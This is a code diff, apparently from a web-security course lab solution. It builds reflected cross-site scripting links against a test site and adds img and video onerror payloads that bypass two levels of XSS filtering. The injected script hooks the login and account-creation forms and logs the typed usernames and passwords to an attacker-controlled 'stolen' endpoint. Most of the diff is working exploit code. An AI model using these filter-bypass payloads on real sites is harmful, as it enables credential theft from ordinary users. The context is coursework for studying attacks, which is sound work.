@@ -11,13 +11,13 @@ function payload(attacker) {
   function addListeners(){
     $("#search-btn").click(function(event){
       event.preventDefault();
-      proxy('./search?q='+$("#query").val())
+      proxy("./search?q="+$("#query").val())
     });
     $("#bungle-lnk,#search-again-btn").click(function(event){
       event.preventDefault();
-      proxy('./');
+      proxy("./");
     });
-    $("#log-in-btn").off('click').on("click",function(event){
+    $("#log-in-btn").off("click").on("click",function(event){
       event.preventDefault();
       log({event: "login", user: $("#username").val(), pass:$("#userpass").val()});
       $("html").load("./login",{"username":$("#username").val(), "password": $("#userpass").val()}, function(response, status, xhr){
@@ -29,7 +29,7 @@ function payload(attacker) {
 
       });
     });
-    $("#new-account-btn").off('click').on("click",function(event){
+    $("#new-account-btn").off("click").on("click",function(event){
       event.preventDefault();
       $("html").load("./create",{"username":$("#username").val(), "password": $("#userpass").val()}, function(response, status, xhr){
         if(status=="error"){
@@ -85,15 +85,15 @@ function makeLink(xssdefense, target, attacker) {
     ";payload(\"" + attacker + "\");</script" + ">");
   } else if(xssdefense==1){
     return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-    encodeURIComponent("<s%26ript" + ">" + payload.toString() +
-    ";payload(\"" + attacker + "\");</script" + ">");
+    encodeURIComponent("<img src='boats' onerror=\'" + payload.toString() + ";payload(\"" + attacker + "\");\'>");
   }
-  else{
-  // Implement code to defeat XSS defenses here.
+  else if(xssdefense==2){
+    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+    encodeURIComponent("<video src='x:x' onerror=\'" + payload.toString() + ";payload(\"" + attacker + "\");\'>");
   }
 }
 
-var xssdefense = 1;
+var xssdefense = 2;
 var target = "http://permalink.co/";
 var attacker = "http://127.0.0.1:31337/stolen";
 $(function() {
